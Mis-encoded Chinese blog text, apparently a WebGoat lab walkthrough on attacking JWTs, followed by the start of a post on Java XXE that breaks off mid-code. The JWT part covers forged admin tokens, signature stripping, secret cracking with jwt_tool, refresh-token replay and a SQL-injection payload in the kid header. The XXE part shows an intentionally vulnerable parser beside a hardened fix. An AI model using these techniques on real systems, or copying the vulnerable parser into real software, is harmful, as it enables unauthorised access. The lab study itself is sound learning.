è¿™å…³çœ‹äº†ä»‹ç»ï¼Œå‘ç°æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨JWTç­¾åéªŒè¯é€»è¾‘é¡ºåºé”™è¯¯çš„æ¼æ´æ¥æ”»å‡»JWTã€‚é»˜è®¤æˆ‘ä»¬ä¸ºguestï¼Œæ²¡æœ‰ä»»ä½•æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸Šå›¾å³ä¾§ä¿®æ”¹æˆ‘ä»¬çš„è§’è‰²ä¸ºå…¶ä»–äººç‰©ï¼Œå³å¯è¿›è¡Œæ­£å¸¸çš„æŠ•ç¥¨ï¼Œæˆ‘ä»¬éšä¾¿ç‚¹å‡»voteå¹¶ç”¨bpæŠ“åŒ…ï¼ŒæˆåŠŸå¾—åˆ°JWT token eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3MDk5MDAzNDMsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiSmVycnkifQ.WysxmVfuu77y_pWCrqh-9ahKpIlM4mjXDUBprpkGwHzQSrHS-9U4LcM_0PCV5N51zRSMirxpD5Sgm_1B9VMljA è¿™é‡Œæˆ‘ä»¬ç›´æ¥å°†adminæ”¹ä¸ºtrue eyJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MDk5MDAzNDMsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9.judvtmb9kKhdMoMdymtqtPZBtlzOG4rpeFoHJsFNolg è¯•äº†å‡ æ¬¡æ— æœï¼Œçœ‹äº†wpå‘ç°ä¼¼ä¹æ˜¯è¦ç‚¹å‡»é‡ç½®æŠ•ç¥¨åŠŸèƒ½çš„ã€‚ã€‚ã€‚ã€‚ã€‚ é‡æ–°å¾—åˆ°token eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3MDk5MDEwMjYsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.peNJmW0dIEc-S-d-S2FqX2kKkNFJOd6EBmMC23XHSR01ybs5UY7sYmoiB0u3VHW53F-VQeOpWuD2VZypfmvDTA //ä¿®æ”¹åå¦‚ä¸‹ eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3MDk5MDEwMjYsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.1j8OQ6le4ECgFN3EPq2yQFhxM4pLwAMJcMfsVx599r09ZtkTOg5QF5xb7EFUdAofvgF2jCVCHrthIc2dxUNryg æ¥ç€æˆ‘åˆå°è¯•å‘åŒ…ï¼Œå‘ç°ä»ç„¶ä¸è¡Œï¼Œçœ‹äº†wpè¯´æ˜¯æ³¨æ„æ—¶é—´æˆ³ï¼ˆè¿™é‡Œæˆ‘æ²¡æ‡‚ï¼Œéš¾é“æ˜¯è¦ç¬¦åˆå‘åŒ…æ—¶é—´å—ï¼Ÿï¼‰æ¥ç€åˆæ‰¾äº†å‡ ç¯‡æ–‡ç« ï¼Œå‘ç°ä»–ä»¬çš„æ–¹æ³•éƒ½æ˜¯å°†æœ€åé¢çš„ç­¾åéƒ¨åˆ é™¤ï¼Œéšåç›´æ¥å‘åŒ…å³å¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º å› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“è¯¥JWTçš„å¯†é’¥ï¼Œå› æ­¤ç›´æ¥ä¿®æ”¹adminä¸è¡Œï¼Œè€Œè¿™é‡Œåˆ é™¤äº†ç¬¬ä¸‰éƒ¨åˆ†ï¼Œä¸”ç»•è¿‡äº†ï¼Œè¯´æ˜åç«¯æ²¡æœ‰æ ¡éªŒç­¾åéƒ¨åˆ†ï¼Œå› æ­¤æˆ‘ä»¬å°±å¯ä»¥ä»»æ„ä¿®æ”¹algçš„å€¼å³å¯é€šè¿‡ å…³å¡äºŒ é¡¾åæ€ä¹‰å°±æ˜¯æš´åŠ›ç ´è§£å¯†é’¥ï¼Œç›´æ¥ä¸Šå·¥å…·ï¼Œæ²¡å•¥è¯´çš„ï¼ŒæˆåŠŸç‡å°±åœ¨äºå­—å…¸æ˜¯å¦å¼ºå¤§äº† eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTcwOTAzNzY5NSwiZXhwIjoxNzA5MDM3NzU1LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.53NEK2Tg8Fg7y-OMeExFQOBC7Ryo5ns8AQ0y-FTdAyc python jwt_tool.py eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTcwOTAzNzY5NSwiZXhwIjoxNzA5MDM3NzU1LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.53NEK2Tg8Fg7y-OMeExFQOBC7Ryo5ns8AQ0y-FTdAyc -C -d jwt-secrets.txt å‘½ä»¤å¦‚ä¸Šï¼ŒæˆåŠŸçˆ†ç ´ï¼šavailable ä¿®æ”¹åå‘é€å‘ç°æŠ±é”™ï¼Œçœ‹äº†çœ‹æ—¶é—´æˆ³ï¼Œå‘ç°è¯¥tokenè¿‡äº†æœ‰æ•ˆæœŸäº†ï¼Œæˆ‘ä»¬ç›´æ¥ä¿®æ”¹expå»¶é•¿è¿‡æœŸæ—¶é—´å³å¯ è¿™é‡Œæˆ‘å°†è¿‡æœŸæ—¶é—´æ”¹ä¸ºäº†æ˜å¤©ï¼Œå¦‚ä¸‹å›¾æˆåŠŸå‘é€ å…³å¡ä¸‰ è¿™é‡Œæ˜¯è®©æˆ‘ä»¬ä¹°ä¸œè¥¿ï¼Œä½†æœ€ç»ˆå‡­å€Ÿæ”»å‡»JWTï¼Œæ¥è®©å…¶ä»–ç”¨æˆ·æ›¿æˆ‘ä»¬ä»˜è´¹ è¿™é‡Œå†ä»”ç»†çœ‹å‘ç°ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œè®°å½•äº†ä¸Šä¸€æ¬¡è¯¥ç½‘ç«™è¢«æ”»å‡»çš„è¡Œä¸ºï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹ å¯ä»¥çœ‹åˆ°å®ƒä¼ å…¥äº†tokenå‚æ•°ï¼Œå¹¶ä¸”å…¶å†…å®¹ä¸ºJWTå½¢å¼ï¼Œæˆ‘ä»¬å¯ä»¥å…·ä½“çœ‹çœ‹ eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q è¿™é‡Œæˆ‘æƒ³ç€ä»¿ç…§ç½‘ç»œæ—¥å¿—çš„æ”»å‡»æ‰‹æ³•ï¼Œç›´æ¥getä¼ å‚çš„ï¼Œç»“æœå‘ç°æ— è®ºå¦‚ä½•éƒ½æ˜¾ç¤ºJWTæ— æ•ˆã€‚çœ‹äº†æ–‡ç« å‘ç°è¿™é‡Œé‡‡ç”¨çš„æ˜¯HTTPèº«ä»½éªŒè¯å½¢å¼ å¦‚å›¾æ‰€ç¤ºï¼Œå½“æˆ‘ä»¬å°†JWTæ”¾å…¥Authorizationå¤´ä¸­å³å¯é€šè¿‡ï¼Œä¸”è¿™é‡Œçš„å¯†é’¥å˜äº†ï¼Œä½†ç©ºç­¾åä¹Ÿèƒ½è¿›å»ï¼Œä¹Ÿæ‡’å¾—çˆ†ç ´äº† ä¹‹ååˆçœ‹äº†æ¼æ´èµ·æºçš„æ–‡ç« ï¼šhttps://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/ å‘ç°æˆ‘ä»¬åœ¨æ—¥å¿—ä¸­çœ‹è§çš„è¯·æ±‚æ¡æ–‡çš„JWTå·²ç»æ˜¯è¿‡æœŸçš„ï¼Œä¹Ÿå°±æ˜¯è®¿é—®ä»¤ç‰Œè¿‡æœŸäº†ï¼Œè€Œè¯¥è®¿é—®ä»¤ç‰Œå¦‚ä¸Šå›¾æ‰€ç¤ºæ˜¯Tomçš„ï¼Œä½†JWTæœåŠ¡å™¨æ˜¾ç„¶æ²¡æœ‰éªŒè¯åˆ·æ–°ä»¤ç‰Œçš„ç”¨æˆ·æ˜¯å¦ä¸è®¿é—®ä»¤ç‰Œçš„ç”¨æˆ·åŒ¹é…ï¼Œå½“æˆ‘ä»¬åˆ©ç”¨è¯¥è¿‡æœŸçš„è®¿é—®ä»¤ç‰Œå»å‘é€httpè¯·æ±‚ç»™JWTæœåŠ¡å™¨æ—¶ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢bpçš„å›¾ç‰‡ï¼Œæˆ‘ä»¬å³å¯è·å¾—ä¸€æ¡å…¨æ–°çš„è®¿é—®ä»¤ç‰Œ å…³å¡å›› è¿™é‡Œæ˜¯è®©æˆ‘ä»¬å‡­å€ŸJWTæ°´å¹³è¶Šæƒåˆ é™¤åˆ«äººçš„è´¦æˆ· è¿™é‡Œæˆ‘å°è¯•æŠ“å–deleteçš„åŒ…ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º è§£å¯†ä¹‹åï¼Œä»”ç»†è§‚å¯Ÿå¯ä»¥å‘ç°ï¼Œè¿™é‡Œå¤šäº†ä¸€ä¸ªkidå‚æ•°ï¼Œå›é¡¾ä¹‹å‰å­¦çš„æ”»å‡»æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘çŒœæµ‹å°±æ˜¯ä¿®æ”¹KIDå‚æ•°äº†ï¼Œè‡³äºæ˜¯é‚£ä¸‰ä¸ªçš„å“ªç§æ–¹æ³•ï¼Œæˆ‘å°±æ²¡æœ‰å¤´ç»ªäº†ï¼Œçœ‹äº†wpå‘ç°æˆ‘ä¼°è®¡æˆ‘æ˜¯æƒ³ä¸åˆ°çš„ æˆ‘ä»¬çŸ¥é“KIDæŒ‡å®šåº”ä½¿ç”¨json webå¯†é’¥é›†ä¸­çš„é‚£ä¸ªå¯†é’¥æ¥éªŒè¯JWTç­¾åï¼Œä¹‹åç»“åˆwpæ¥çœ‹æœ‰äº†å¦‚ä¸‹è§‚ç‚¹ï¼š ç­¾åç”¨çš„ secret key åº”è¯¥æ˜¯æ ¹æ® kid åœ¨åå°æŸ¥è¯¢æ•°æ®åº“å¾—åˆ°çš„ã€‚ é‚£ä¹ˆè¿™ä¸ª kid æ˜¯å¦å­˜åœ¨ SQL æ³¨å…¥æ¼æ´ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥æ§åˆ¶è¿™ä¸ªè®¤è¯ç”¨çš„ secret key å‘¢ï¼Ÿ ç›´æ¥ç”¨ union select æŸ¥è¯¢æ¥æ§åˆ¶ secret key ä¸ºè‡ªå®šä¹‰çš„å€¼ï¼Œæ¯”å¦‚ passwordã€‚ æ¥ç€å°è¯•å‘é€ï¼Œä¾æ—§æ˜¯æ— æ•ˆçš„JWTï¼Œæ— å¥ˆæˆ‘ä»¬çœ‹ä¸€ä¸‹æºç å¦‚ä½•å¤„ç† ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œå…ˆæ˜¯æ¥å—tokenå‚æ•°ï¼Œæ¥ç€åˆ¤æ–­tokenæ˜¯å¦ä¸ºç©ºæ¥å†³å®šæ˜¯å¦åç»­è¿›è¡ŒéªŒè¯JWTåˆæ³•æ€§ã€‚ å…¶ä¸­åœ¨éªŒè¯å…¶åˆæ³•æ€§ä¸­ï¼Œå…¶æ ¹æ®JWTä¸­çš„kidçš„å€¼æ¥è¿›å…¥æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢ç›¸åº”çš„å¯†é’¥keyï¼Œä¸”æŸ¥è¯¢åˆ°çš„å†…å®¹ä¼šè¿›è¡Œbase64çš„ç¼–ç ã€‚ é‡ç‚¹æ˜¯è¿™é‡Œå¯¹kidçš„å€¼æ²¡æœ‰åšå‡ºè¿‡æ»¤ï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä¸è¿›è¡Œsqlæ³¨å…¥ payloadï¼š\"kid\": \"hybcx' union select 'MQ==' from INFORMATION_SCHEMA.SCHEMATA--\", å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæ¥ç€å‘é€bpå³å¯ï¼Œè¿™é‡Œç–‘æƒ‘çš„ç‚¹æ˜¯ï¼Œä¸ºä½•ä¸Šè¿°çš„keyï¼š1è¿™ä¸ªåœ°æ–¹ä¸èƒ½ select 1 ï¼Œéšååœ¨ä¸‹é¢çš„ç­¾åå¤„å¯¹secretè¿›è¡Œbase64åŠ å¯†ï¼ˆè¿™ç§æƒ³æ³•è€æ˜¯é¡µé¢æŠ¥é”™ï¼‰ 0x05 å‚è€ƒæ–‡ç«  JWTæ¼æ´çš„åŸºç¡€å­¦ä¹  2018CUMTCTF-Final-Web æ”»å‡»JWTçš„ä¸€äº›æ–¹æ³• WebGoat é¶åœºé€šå…³ç¬”è®° ldentity &amp; Auth Failure Webgoat - JWT tokens éƒ¨åˆ†æ”»ç•¥ å­¦ä¹ JWTï¼Œçœ‹è¿™ç¯‡å°±å¤Ÿäº†ï¼ JWTæ¼æ´å¤ç°","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"æµ…æxxeæ¼æ´-Java","path":"/2024/02/26/qian-xi-xxe-lou-dong-java/","content":"0x01 å‰è¨€ æœ€è¿‘å‘äº†å­¦æ–°ä»»åŠ¡ï¼Œå‘ç°XXEçš„Javaæ²¡æœ‰å­¦ä¹ è¿‡ï¼Œäºæ˜¯æƒ³ç€æ‰¾å‡ ç¯‡æ–‡ç« å­¦ä¹ ä¸€ä¸‹ã€‚Javaæ°´å¹³ä¹Ÿåƒåœ¾ï¼Œåªæ˜¯å•çº¯è¿‡äº†è¿‡åŸºç¡€è¯­æ³•ï¼Œå­¦èµ·æ¥å¯¹æˆ‘è¿˜æ˜¯æœ‰éš¾åº¦~~~ ç”±äºæ°´å¹³åƒåœ¾ï¼Œå› æ­¤åŸºæœ¬å°±æ˜¯è·Ÿç€æ–‡ç« çš„å®éªŒå®æ“ä¸€éï¼Œè´¨é‡å¯èƒ½ä¸é«˜ 0x02 XXEæ¼æ´åŸºç¡€ è¿™é‡Œç®€å•è¿‡ä¸€ä¸‹ï¼Œå› ä¸ºçœ‹è§æœ‰çš„å¸ˆå‚…æ–‡ç« å†™çš„åŸºç¡€çŸ¥è¯†ç²¾è¾Ÿï¼Œä¸”ä»æœ‰éœ€è¦å­¦ä¹ çš„åœ°æ–¹ï¼Œè¿™é‡Œå°±å¤§éƒ¨åˆ†cväº† XMLæ–‡æ¡£ç»“æ„ï¼š XMLä¸»è¦ç”±7ä¸ªéƒ¨åˆ†ç»„æˆï¼šæ–‡æ¡£å£°æ˜ã€æ ‡ç­¾/å…ƒç´ ã€å±æ€§ã€æ³¨é‡Šã€å®ä½“å­—ç¬¦ã€CDATA å­—ç¬¦æ•°æ®åŒºã€å¤„ç†æŒ‡ä»¤ã€‚ &lt;!--XMLæ–‡æ¡£å£°æ˜ï¼›å¦å¤–ä¹Ÿæ˜¯ä¸€ä¸ªå¤„ç†æŒ‡ä»¤ï¼Œ&lt;? xxx ?&gt;å°±æ˜¯å¤„ç†æŒ‡ä»¤çš„æ ¼å¼--&gt; &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;!--bookstoreæ ¹å…ƒç´ ã€bookå­å…ƒç´ --&gt; &lt;bookstore&gt; &lt;!--categoryã€langéƒ½æ˜¯å±æ€§--&gt; &lt;book category=\"COOKING\"&gt; &lt;title lang=\"en\"&gt;Everyday Italian&lt;/title&gt; &lt;!--&amp;lt;å®ä½“å­—ç¬¦ æ˜¯ä¸€ä¸ªé¢„å®šä¹‰çš„å®ä½“å¼•ç”¨ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥å¼•ç”¨dtdä¸­å®šä¹‰çš„å®ä½“ï¼Œä»¥ &amp; å¼€å¤´, ä»¥;ç»“å°¾--&gt; &lt;author&gt;Giada De Laurentiis&amp;lt;&lt;/author&gt; &lt;year&gt;2005&lt;/year&gt; &lt;price&gt;30.00&lt;/price&gt; &lt;!--scriptè¿™é‡Œæ˜¯CDATAï¼Œä¸èƒ½è¢«xmlè§£æå™¨è§£æï¼Œå¯ä»¥è¢«JavaScriptè§£æ--&gt; &lt;script&gt; &lt;![CDATA[ function matchwo(a,b) { if (a &lt; b &amp;&amp; a &lt; 0) then {return 1;} else {return 0;} } ]]&gt; &lt;/script&gt; &lt;/book&gt; &lt;/bookstore&gt; CDATA æŒ‡çš„æ˜¯ä¸åº”ç”± XML è§£æå™¨è¿›è¡Œè§£æçš„æ–‡æœ¬æ•°æ®ï¼ˆUnparsed Character Dataï¼‰ã€‚CDATA éƒ¨åˆ†ä¸­çš„æ‰€æœ‰å†…å®¹éƒ½ä¼šè¢«è§£æå™¨å¿½ç•¥ã€‚ CDATA éƒ¨åˆ†ç”± â€œ**â€ ç»“æŸï¼ŒæŸäº›æ–‡æœ¬æ¯”å¦‚ JavaScript ä»£ç ï¼ŒåŒ…å«å¤§é‡ â€œ&lt;â€ æˆ– â€œ&amp;â€ å­—ç¬¦ã€‚ä¸ºäº†é¿å…é”™è¯¯ï¼Œå¯ä»¥å°†è„šæœ¬ä»£ç å®šä¹‰ä¸º CDATAã€‚ XMLç¤ºä¾‹ï¼š å¦‚ä¸‹å®ä¾‹ï¼Œ&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;æ˜¯XMLå£°æ˜ï¼Œ&lt;!DOCTYPE description [&lt;!ENTITY abc \"123213123123123\" &gt;]&gt;å°±æ˜¯DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œ&lt;description&gt;&amp;abc;&lt;/description&gt;æ˜¯æ–‡æ¡£å…ƒç´  å…¶ä¸­abcå°±æ˜¯å¼•ç”¨çš„dtdä¸­çš„abcã€‚ &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;!DOCTYPE description [ &lt;!ENTITY abc \"123213123123123\" &gt; ]&gt; &lt;description&gt;&amp;abc;&lt;/description&gt; DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼š DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚DTD å¯ä»¥åœ¨ XML æ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥ä»å¤–éƒ¨å¼•ç”¨ã€‚DTDå®ä½“ä¹Ÿåˆ†ä¸ºå¤–éƒ¨å¼•ç”¨å’Œå†…éƒ¨å®šä¹‰ã€‚ DTDä¸¤ç§å¼•å…¥æ–¹å¼ï¼š åœ¨XMLå†…éƒ¨å£°æ˜DTDï¼š &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE note [ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT message (#PCDATA)&gt;]&gt; &lt;note&gt; &lt;to&gt;George&lt;/to&gt; &lt;from&gt;John&lt;/from&gt; &lt;message&gt;Reminder&lt;/message&gt; &lt;/note&gt; åœ¨XMLä¸­å¼•å…¥å¤–éƒ¨DTDæ–‡æ¡£ &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE note SYSTEM \"note.dtd\"&gt; &lt;note&gt; &lt;to&gt;George&lt;/to&gt; &lt;from&gt;John&lt;/from&gt; &lt;message&gt;Reminder&lt;/message&gt; &lt;/note&gt; &lt;!--è€Œnote.dtdçš„å†…å®¹ä¸º:--&gt; &lt;!ELEMENT note (to,from,message)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT message (#PCDATA)&gt; DTDå®ä½“ä¸¤ç§æ–¹å¼ï¼š å®ä½“åˆåˆ†ä¸ºä¸€èˆ¬å®ä½“å’Œå‚æ•°å®ä½“ï¼šä¸€èˆ¬å®ä½“çš„å£°æ˜è¯­æ³•&amp;å®ä½“åï¼›ï¼›å‚æ•°å®ä½“åªèƒ½åœ¨DTDä¸­ä½¿ç”¨ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ ¼å¼ï¼š%å®ä½“åï¼›ã€‚ å†…éƒ¨å®ä½“ï¼š åœ¨dtdä¸­å®šä¹‰äº†ä¸€ä¸ªåä¸ºtestçš„å®ä½“ï¼Œå®ä½“çš„å€¼ä¸ºtest-valueï¼š &lt;!ENTITY test \"test-value\"&gt; å¤–éƒ¨å®ä½“ï¼š åœ¨dtdä¸­å®šä¹‰äº†ä¸€ä¸ªåä¸ºtestçš„å®ä½“ï¼Œå®ä½“çš„å€¼ä¸ºURLï¼š &lt;!ENTITY test SYSTEM \"URI/URL\"&gt; &lt;!ENTITY test SYSTEM \"file:///C://1.dtd\"&gt; &lt;!ENTITY test SYSTEM \"http://test.com/1.dtd\"&gt; å¸¸è§çš„xmlè§£ææ–¹å¼æœ‰ä»¥ä¸‹å››ç§: 1)DOMç”Ÿæˆå’Œè§£æXMLæ–‡æ¡£ 2)SAXç”Ÿæˆå’Œè§£æXMLæ–‡æ¡£ 3)DOM4Jç”Ÿæˆå’Œè§£æXMLæ–‡æ¡£ 4)JDOMç”Ÿæˆå’Œè§£æDOMæ–‡æ¡£ SAXæ˜¯ä»¥æµçš„å½¢å¼è¯»å–XMLæ–‡æ¡£ä¸­çš„å†…å®¹ï¼Œå¹¶åœ¨è¯»å–è¿‡ç¨‹ä¸­è‡ªåŠ¨è°ƒç”¨é¢„å…ˆå®šä¹‰çš„å¤„ç†æ–¹æ³•ï¼›DOMæ˜¯å°†æ•´ä¸ªxmlæ–‡æ¡£ä¸­çš„å†…å®¹ä»¥treeçš„å½¢å¼å­˜å‚¨åœ¨å†…å­˜å½“ä¸­ï¼Œå¯ä»¥å¯¹è¿™ä¸ªtreeä¸­çš„ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹è¿›è¡Œæ“ä½œï¼ŒSAXåˆ™ä¸èƒ½ã€‚SAXä¸é€‚åˆç”¨æ¥ä¿®æ”¹xmlå†…å®¹ï¼ŒDOMéœ€è¦è€—è´¹å¤§é‡å†…å­˜ 0x03 å®éªŒ å®æ“æ‰å‘ç°ï¼Œæ­ç¯å¢ƒå¯¹æˆ‘æ¥è¯´æˆäº†å¤§é—®é¢˜ã€‚ã€‚ã€‚ã€‚å› æ­¤è¿™é‡Œå…ˆç®€å•è®°å½•çŸ¥è¯†ï¼ŒJavaä¸‹å»å¾—è¡¥è¡¥äº† åœ¨Javaä¸­æœ‰å¾ˆå¤šjaråŒ…å¯ä»¥æ¥è§£æXMLï¼š javax.xml.parsers.DocumentBuilder javax.xml.parsers.SAXParser javax.xml.parsers.SAXParserFactory javax.xml.transform.TransformerFactory javax.xml.validation.Validator javax.xml.validation.SchemaFactory javax.xml.transform.sax.SAXTransformerFactory javax.xml.transform.sax.SAXSource org.xml.sax.XMLReader org.xml.sax.helpers.XMLReaderFactory org.dom4j.io.SAXReader org.jdom.input.SAXBuilder org.jdom2.input.SAXBuilder javax.xml.bind.Unmarshaller javax.xml.xpath.XpathExpression javax.xml.stream.XMLStreamReader org.apache.commons.digester3.Digester SAXBuilderè§£æxmlå¹¶ä¿®å¤æ¼æ´ å®éªŒç¼–å†™çš„servletå¦‚ä¸‹ï¼Œå…¶ä¸­postNoFixXxeæ˜¯æœªä¿®å¤æ—¶çš„æ–¹æ³•ï¼ŒpostWithFixXxeæ˜¯ä¿®å¤åçš„æ–¹æ³•ï¼Œä¿®å¤æ—¶é€šè¿‡ builder.setFeatureè®¾ç½®å¤–éƒ¨å®ä½“ä¸èƒ½è¢«è§£æçš„æ–¹æ³•ä»è€Œé˜²å¾¡xxeæ¼æ´ã€‚ import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.BufferedReader; import java.io.IOException; import java.io.PrintWriter; import org.jdom2.JDOMException; import org.jdom2.input.SAXBuilder; import org.jdom2.Document; import org.jdom2.output.XMLOutputter; public class SAXBuilderServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { super.doGet(req, resp); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { // postNoFixXxe(req, resp); postWithFixXxe(req, resp); } private void postNoFixXxe(HttpServletRequest req, HttpServletResponse resp) { try { //è·å–è¯·æ±‚è¾“å…¥æµ BufferedReader reader = req.getReader(); //å°†xmlè¯»å–åˆ°doc SAXBuilder builder = new SAXBuilder(); //ä½¿ç”¨é»˜è®¤è§£æå™¨ Document doc = builder.build(reader); // è·å–å“åº”è¾“å‡ºæµ PrintWriter writer = resp.getWriter(); //å°†docå†™åˆ°è¾“å‡ºæµ XMLOutputter outputter = new XMLOutputter(); outputter.output(doc, writer); } catch (JDOMException | IOException e) { e.printStackTrace(); } } private void postWithFixXxe(HttpServletRequest req, HttpServletResponse resp) { try { //è·å–è¯·æ±‚è¾“å…¥æµ BufferedReader reader = req.getReader(); //å°†xmlè¯»å–åˆ°docï¼Œé€šè¿‡setFeatureè®¾ç½®dtdã€å¤–éƒ¨å®ä½“è¯»å– é˜²æ­¢xxeæ¼æ´ SAXBuilder builder = new SAXBuilder(); builder.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); builder.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); builder.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); builder.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false); Document doc = builder.build(reader); // è·å–å“åº”è¾“å‡ºæµ PrintWriter writer = resp.getWriter(); //å°†docå†™åˆ°è¾“å‡ºæµ XMLOutputter outputter = new XMLOutputter(); outputter.output(doc, writer); } catch (JDOMException | IOException e) { e.printStackTrace(); } } } ä¸¤ç§æ–¹æ³•å¯¹æ¯”å³å¯å‘ç°é˜²å¾¡ä»£ç éƒ¨åˆ†ä¸ºï¼š builder.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); builder.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); builder.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); builder.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false); çœ‹åˆ°è¿™é‡Œæ˜¯å¯¹builderçš„setFeatureå±æ€§åšå‡ºäº†æ›´æ”¹ï¼Œå¯¹äºé‡Œé¢çš„å†…å®¹ï¼Œé¡¾åæ€ä¹‰ä¹Ÿå¾ˆå®¹æ˜“çŸ¥é“è¿™é‡Œå¯¹äºç¦æ­¢ XML æ–‡æ¡£ä¸­çš„æ–‡æ¡£ç±»å‹å£°æ˜ï¼ˆDOCTYPE declarationï¼‰ï¼šdisallow-doctype-declï¼ˆè®¾ç½®trueï¼‰ã€å¤–éƒ¨å®ä½“åŠ è½½ï¼šexternal-general-entitiesã€å¤–éƒ¨å‚æ•°å®ä½“ï¼šexternal-parameter-entitiesã€åŠ è½½å¤–éƒ¨dtdæ–‡ä»¶ï¼šload-external-dtdéƒ½è®¾ç½®äº†falseï¼Œæœç»çš„xxeçš„å¯èƒ½ å½“åœ¨doPostä¸­è°ƒç”¨postNoFixXxeæ—¶ï¼Œæ„é€ xmlï¼ŒæˆåŠŸè®¿é—®æ–‡ä»¶å†…å®¹ï¼Œå¯ä»¥å¯¼è‡´xxeæ¼æ´ã€‚ï¼ˆä»¥ä¸‹éƒ½å€Ÿç”¨å¸ˆå‚…çš„å›¾äº†ï¼‰ å½“åœ¨doPostä¸­è°ƒç”¨postWithFixXxeæ—¶ï¼ŒæˆåŠŸé˜²å¾¡äº†xxeæ¼æ´ï¼Œå“åº”æœªè¾“å‡ºxmlï¼Œå¹¶ä¸”logæŠ¥é”™ä¸å…è®¸dtdã€‚ DocumentBuilder(åŸç”Ÿdomè§£æxml) ä¸ºäº†æ–¹ä¾¿è¾“å‡ºç”¨äº†TransformerFactoryå°†documentè¾“å‡ºåˆ°å“åº”æµã€‚ import org.w3c.dom.Document; import org.xml.sax.InputSource; import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.xml.XMLConstants; import javax.xml.parsers.DocumentBuilder; import javax.xml.parsers.DocumentBuilderFactory; import java.io.BufferedReader; import java.io.IOException; import java.io.PrintWriter; public class DocumentBuilderServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { super.doGet(req, resp); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { postNoFixXxe(req, resp); // postWithFixXxe(req, resp); } private void postNoFixXxe(HttpServletRequest req, HttpServletResponse resp) { try { DocumentBuilderFactory documentBuilderFactory = 